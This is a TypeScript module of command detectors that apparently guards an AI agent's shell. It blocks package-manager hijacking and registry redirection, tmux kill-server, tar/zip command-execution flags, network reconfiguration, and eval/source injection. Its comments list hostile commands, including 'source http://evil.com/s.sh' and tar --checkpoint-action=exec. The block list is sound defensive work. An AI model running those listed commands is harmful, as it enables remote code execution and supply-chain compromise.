// Split from bash-security.ts by scripts/split-module.mjs (move-only; verified by scripts/verify-split.mjs).
import { stripInvisibleUnicode } from './bash-security-strip-invisible-unicode';

// ---------------------------------------------------------------------------
// Package manager path hijacking & npm script injection detector
// ---------------------------------------------------------------------------
// Blocks package manager commands that can hijack dependency resolution,
// shadow stdlib imports, or execute arbitrary code via lifecycle scripts:
//   - pip install --target / -t . (shadows imports in the project)
//   - pip install --user --prefix with unusual paths
//   - pip install -e <url> (editable install from remote — runs setup.py)
//   - npm link (creates global symlink hijacking dep resolution)
//   - npm install --global-style with unusual directories
//   - gem install --install-dir / -i targeting project paths
// Allowed:
//   - pip install package, pip install -r requirements.txt
//   - npm install, npm install package
//   - gem install package

export function detectPackageManagerHijack(command: string): { blocked: boolean; reason?: string } {
  const stripped = stripInvisibleUnicode(command);

  // --- pip install --target / -t ---
  // Shadows stdlib or project imports by dumping packages into the current dir
  if (/\bpip[3]?\s+install\b/.test(stripped)) {
    // Block --target or -t with any value
    if (/\s(?:--target(?:\s+|=)\S+|-t\s+\S+)(?:\s|$)/.test(stripped)) {
      return { blocked: true, reason: 'pip install --target can shadow stdlib imports by placing packages in the project directory' };
    }
    // Block --user combined with --prefix (unusual install location)
    if (/\s--user(?:\s|$)/.test(stripped) && /\s--prefix(?:\s+|=)\S+/.test(stripped)) {
      return { blocked: true, reason: 'pip install --user --prefix with custom path can hijack package resolution' };
    }
    // Block -e / --editable with URLs (remote editable install runs arbitrary setup.py)
    if (/\s(?:-e|--editable)\s+(?:https?:|git\+|git:|svn\+|hg\+|bzr\+)\S+/.test(stripped)) {
      return { blocked: true, reason: 'pip install -e with remote URL runs arbitrary setup.py from untrusted source' };
    }
  }

  // --- npm link ---
  // Creates a global symlink that hijacks dependency resolution for the package.
  // `npm link <pkg>` and bare `npm link` are both dangerous.
  // Allow: `npm install --link` (different flag), `npm ls` (list), etc.
  if (/\bnpm\s+link\b/.test(stripped)) {
    return { blocked: true, reason: 'npm link creates global symlinks that can hijack dependency resolution' };
  }

  // --- npm install --global-style ---
  // Installs packages with a flat node_modules layout that can shadow other packages
  if (/\bnpm\s+install\b/.test(stripped) && /\s--global-style\b/.test(stripped)) {
    return { blocked: true, reason: 'npm install --global-style can hijack dependency resolution with unusual directory layout' };
  }

  // --- gem install --install-dir / -i ---
  // Targets a custom directory, potentially shadowing existing gems in the project
  if (/\bgem\s+install\b/.test(stripped)) {
    if (/\s(?:--install-dir(?:\s+|=)\S+|-i\s+\S+)(?:\s|$)/.test(stripped)) {
      return { blocked: true, reason: 'gem install --install-dir can shadow gems by placing them in a project directory' };
    }
  }

  // --- registry / index redirection (dependency-confusion / supply-chain) ---
  // Redirecting a package manager's registry/index to an attacker-controlled host
  // lets a malicious server substitute a trojanned package (dependency confusion).
  // the reference hardens its own installs by running from $HOME so a project-level
  // pip.conf/.npmrc cannot redirect the registry; the command-string analog is to
  // block an install that redirects the index/registry to a URL on the CLI.
  // pip: --index-url / --extra-index-url / -i <url>
  if (/\bpip[3]?\s+install\b/.test(stripped) &&
      /\s(?:--index-url|--extra-index-url|-i)(?:\s+|=)(?:https?|ftp|file):\/\/\S+/.test(stripped)) {
    return { blocked: true, reason: 'pip install --index-url/--extra-index-url redirects the package index to an arbitrary host — dependency-confusion / supply-chain risk' };
  }
  // npm / yarn / pnpm / bun: --registry <url>
  if (/\b(?:npm|yarn|pnpm|bun)\b/.test(stripped) && /\b(?:install|add|i|ci)\b/.test(stripped) &&
      /\s--registry(?:\s+|=)(?:https?|ftp|file):\/\/\S+/.test(stripped)) {
    return { blocked: true, reason: 'package install --registry redirects the registry to an arbitrary host — dependency-confusion / supply-chain risk' };
  }

  return { blocked: false };
}

// ---------------------------------------------------------------------------
// Destructive tmux command detector
// ---------------------------------------------------------------------------
// the reference isolates its tmux operations onto a private socket (tmuxSocket.ts)
// precisely so an agent-issued `tmux kill-server` / `kill-session` cannot destroy
// the user's own tmux sessions (which, if the reference was launched from inside tmux,
// share the default socket). AMI has no tmux-socket isolation, so the command-
// string guard is to block the server-/session-wide destructive subcommands
// outright. Per-pane/window operations and all read-only/attach subcommands
// (ls, list-sessions, new-session, send-keys, attach, …) stay allowed.
// Blocked:   tmux kill-server, tmux kill-session, tmux kill-server -t x
// Allowed:   tmux ls, tmux list-sessions, tmux new-session, tmux send-keys …
// Allow any intervening option/value tokens between `tmux` and the kill
// subcommand (e.g. `tmux -L default kill-server`) but stop at a command
// separator so a later unrelated segment is not swept in.
// eslint-disable-next-line security/detect-unsafe-regex -- lazy token class is separator-bounded, linear on short command strings
export const DESTRUCTIVE_TMUX_RE = /(?:^|[\s;|&(])tmux\s+(?:[^\s;|&]+\s+)*?kill-(?:server|session)\b/;

export function detectDestructiveTmux(command: string): { blocked: boolean; reason?: string } {
  const stripped = stripInvisibleUnicode(command);
  if (!/\btmux\b/.test(stripped)) return { blocked: false };
  if (DESTRUCTIVE_TMUX_RE.test(stripped)) {
    return { blocked: true, reason: 'tmux kill-server/kill-session can destroy the user’s tmux sessions — blocked (AMI does not isolate tmux onto a private socket)' };
  }
  return { blocked: false };
}

// ---------------------------------------------------------------------------
// Archive-tool command-execution detector — blocks tar/zip flags that run an
// arbitrary shell command as a side effect of (un)archiving. These are classic
// GTFOBins RCE primitives that evade command-name allow/deny checks because the
// payload lives in a flag value, and `tar`/`zip` themselves look benign.
// ---------------------------------------------------------------------------
// Blocked (tar):
//   tar --to-command=<cmd>                 (runs <cmd> for each archived member)
//   tar --checkpoint-action=exec=<cmd>     (runs <cmd> at a checkpoint)
//   tar --rmt-command=<cmd>                (arbitrary remote-tape helper)
//   tar --info-script=<cmd> / -F <cmd>     (runs <cmd> at volume change)
// Blocked (zip):
//   zip --unzip-command=<cmd>              (runs <cmd> to test the archive)
//   zip --test-command=<cmd> / -TT <cmd>   (runs <cmd> to test the archive)
// Allowed:
//   tar -czf a.tgz dir   tar -xf a.tar   zip -r a.zip dir   unzip a.zip
// Note: tar -I/--use-compress-program (custom compressor) is intentionally NOT
// blocked — `tar -I zstd` is ordinary usage; the exec hooks above have no benign
// agent use. `--checkpoint-action` values other than `exec` (dot/echo/sleep/…)
// are inert and stay allowed.
export function detectArchiveToolExecution(command: string): { blocked: boolean; reason?: string } {
  const stripped = stripInvisibleUnicode(command);

  if (/\btar\b/.test(stripped)) {
    if (/\s--to-command[=\s]/.test(stripped)) {
      return { blocked: true, reason: 'tar --to-command runs an arbitrary shell command per archived file' };
    }
    if (/\s--checkpoint-action[=\s]\S*exec/i.test(stripped)) {
      return { blocked: true, reason: 'tar --checkpoint-action=exec executes an arbitrary command' };
    }
    if (/\s--rmt-command[=\s]/.test(stripped)) {
      return { blocked: true, reason: 'tar --rmt-command runs an arbitrary command as the remote-tape helper' };
    }
    if (/\s(?:--info-script|--new-volume-script|-F)[=\s]/.test(stripped)) {
      return { blocked: true, reason: 'tar --info-script/-F runs an arbitrary script at volume change' };
    }
  }

  if (/\bzip\b/.test(stripped)) {
    if (/\s--unzip-command[=\s]/.test(stripped)) {
      return { blocked: true, reason: 'zip --unzip-command runs an arbitrary command to test the archive' };
    }
    if (/\s(?:--test-command|-TT)[=\s]/.test(stripped)) {
      return { blocked: true, reason: 'zip -TT/--test-command runs an arbitrary command to test the archive' };
    }
  }

  return { blocked: false };
}

// ---------------------------------------------------------------------------
// Network interface manipulation detector — blocks commands that reconfigure
// network interfaces, IP addresses, routing tables, routing policy, or ARP
// entries via `ip` subcommands or `ifconfig` set operations.
// ---------------------------------------------------------------------------
// Blocked:
//   ip link set (bring interfaces up/down, change settings)
//   ip addr add/del (add/remove IP addresses)
//   ip route add/del (modify routing table)
//   ip rule add/del (modify routing policy)
//   ip neigh add/del (modify ARP/neighbor table)
//   ifconfig <iface> <ip-addr> (assign IP address)
//   ifconfig <iface> up/down (bring interface up/down)
// Allowed:
//   ip addr show, ip addr list (read-only)
//   ip link show (read-only)
//   ip route show, ip route list (read-only)
//   ip -s link, ip -brief addr (read-only with flags)
//   ifconfig (no args — show all interfaces)
//   ifconfig eth0 (show single interface)

export function detectNetworkManipulation(command: string): { blocked: boolean; reason?: string } {
  const stripped = stripInvisibleUnicode(command);

  // --- ip subcommands ---
  // Match `ip` as a standalone command (not e.g. `grip`, `unzip`)
  if (/(?:^|[\s;|&])ip\s/.test(stripped)) {
    // ip link set — reconfigure interfaces (up/down, name, mtu, etc.)
    // eslint-disable-next-line security/detect-unsafe-regex -- \S and \s are disjoint, linear scan
    if (/\bip\s+(?:-\S+\s+)*link\s+set\b/.test(stripped)) {
      return { blocked: true, reason: 'ip link set can reconfigure network interfaces — blocked' };
    }

    // ip addr add/del — add or remove IP addresses from interfaces
    // eslint-disable-next-line security/detect-unsafe-regex -- \S and \s are disjoint, linear scan
    if (/\bip\s+(?:-\S+\s+)*addr\s+(?:add|del|delete)\b/.test(stripped)) {
      return { blocked: true, reason: 'ip addr add/del can modify interface IP addresses — blocked' };
    }

    // ip route add/del — modify the routing table
    // eslint-disable-next-line security/detect-unsafe-regex -- \S and \s are disjoint, linear scan
    if (/\bip\s+(?:-\S+\s+)*route\s+(?:add|del|delete|replace|change|append|prepend)\b/.test(stripped)) {
      return { blocked: true, reason: 'ip route add/del can modify the routing table — blocked' };
    }

    // ip rule add/del — modify routing policy rules
    // eslint-disable-next-line security/detect-unsafe-regex -- \S and \s are disjoint, linear scan
    if (/\bip\s+(?:-\S+\s+)*rule\s+(?:add|del|delete)\b/.test(stripped)) {
      return { blocked: true, reason: 'ip rule add/del can modify routing policy — blocked' };
    }

    // ip neigh add/del — modify ARP/neighbor table entries
    // eslint-disable-next-line security/detect-unsafe-regex -- \S and \s are disjoint, linear scan
    if (/\bip\s+(?:-\S+\s+)*neigh\s+(?:add|del|delete|replace|change)\b/.test(stripped)) {
      return { blocked: true, reason: 'ip neigh add/del can modify ARP/neighbor table entries — blocked' };
    }
  }

  // --- ifconfig set operations ---
  // ifconfig alone or ifconfig <iface> alone are read-only (show info).
  // ifconfig <iface> <ip-addr>, ifconfig <iface> up/down, ifconfig <iface> netmask/broadcast
  // are all set operations that modify network state.
  if (/(?:^|[\s;|&])ifconfig\s/.test(stripped)) {
    // Match ifconfig <iface> followed by set keywords or an IP address
    // Set keywords: up, down, netmask, broadcast, metric, mtu, promisc, -promisc, pointopoint
    if (/\bifconfig\s+\S+\s+(?:up|down|netmask|broadcast|metric|mtu|promisc|-promisc|pointopoint)\b/.test(stripped)) {
      return { blocked: true, reason: 'ifconfig with set operation can reconfigure network interfaces — blocked' };
    }
    // ifconfig <iface> <ip-address-like> — setting an IP address
    // Match an IP-like pattern: digits.digits.digits.digits
    if (/\bifconfig\s+\S+\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/.test(stripped)) {
      return { blocked: true, reason: 'ifconfig with IP address assignment can reconfigure network interfaces — blocked' };
    }
  }

  return { blocked: false };
}

/**
 * Decode all \xHH hex escape sequences in a string to their character equivalents.
 */
export function decodeHexEscapes(s: string): string {
  return s.replace(/\\x([0-9A-Fa-f]{2})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16)),
  );
}

/**
 * Decode all \NNN octal escape sequences (1-3 octal digits) in a string to
 * their character equivalents. Requires the leading backslash and 1-3 digits
 * in [0-7].
 */
export function decodeOctalEscapes(s: string): string {
  return s.replace(/\\([0-7]{1,3})/g, (_, oct) =>
    String.fromCharCode(parseInt(oct, 8)),
  );
}

/**
 * Extract string arguments from echo -e or printf invocations, including
 * both single-quoted and double-quoted strings.
 */
export function extractStringArgs(afterCmd: string): string[] {
  const args: string[] = [];
  const re = /(?:'([^']*)'|"([^"]*)")/g;
  let m;
  while ((m = re.exec(afterCmd)) !== null) {
    args.push(m[1] ?? m[2]);
  }
  return args;
}

// ---------------------------------------------------------------------------
// Source / dot-script / eval injection detector — blocks commands that execute
// scripts in the current shell context or dynamically generate and run code.
// ---------------------------------------------------------------------------
// Blocked:
//   source <(process_substitution) — always blocked
//   . <(process_substitution)       — always blocked
//   eval "$(cmd)"                   — always blocked
//   source http://evil.com/s.sh     — always blocked (remote URL)
//   source anything (detached mode) — blocked unless venv activation
// Allowed:
//   source ~/.bashrc                — standard shell config (interactive mode)
//   source ./venv/bin/activate      — common dev workflow (all modes)

export function detectSourceExecution(command: string, options?: { detachedMode?: boolean }): { blocked: boolean; reason?: string } {
  const stripped = stripInvisibleUnicode(command);
  const detached = options?.detachedMode === true;

  // 1. Always block source/dot with process substitution: source <(...)
  if (/\bsource\s+<\(/.test(stripped)) {
    return {
      blocked: true,
      reason: 'source with process substitution loads dynamically generated code into the current shell',
    };
  }
  if (/(?:^|[\s;|&(])\.\s+<\(/.test(stripped)) {
    return {
      blocked: true,
      reason: 'dot-script with process substitution loads dynamically generated code into the current shell',
    };
  }

  // 2. Always block eval with command substitution — dynamic code execution
  //    Matches: eval "$(cmd)", eval $(cmd), eval "`cmd`", eval `cmd`
  if (/\beval\s+(?:"\$\(|\$\(|"\`|'\$\(|\`)/.test(stripped)) {
    return {
      blocked: true,
      reason: 'eval with command substitution executes dynamically generated code',
    };
  }

  // 3. Collect source/dot targets for further inspection
  const sourceTargets: string[] = [];
  {
    const re = /\bsource\s+(\S+)/g;
    let m;
    while ((m = re.exec(stripped)) !== null) {
      sourceTargets.push(m[1]);
    }
  }
  {
    // Match `. file` (dot-source) but NOT `. -flag` or standalone `.`
    // The target must start with a path character, not a dash (flag).
    const re = /(?:^|[\s;|&(])\.\s+((?!-)\S+)/g;
    let m;
    while ((m = re.exec(stripped)) !== null) {
      sourceTargets.push(m[1]);
    }
  }

  for (const target of sourceTargets) {
    // Skip process substitution targets (already handled above)
    if (target.startsWith('<(')) continue;

    // Always block remote URLs
    if (/^https?:\/\//.test(target)) {
      return {
        blocked: true,
        reason: `source/dot-script with remote URL '${target}' loads and executes untrusted remote code`,
      };
    }

    // In detached mode: block everything except venv activation
    if (detached) {
      if (/venv\/bin\/activate$|\.venv\/bin\/activate$/.test(target)) {
        continue; // allowed
      }
      return {
        blocked: true,
        reason: `source/dot-script '${target}' blocked in detached mode — scripts execute in the current shell context`,
      };
    }
  }

  return { blocked: false };
}
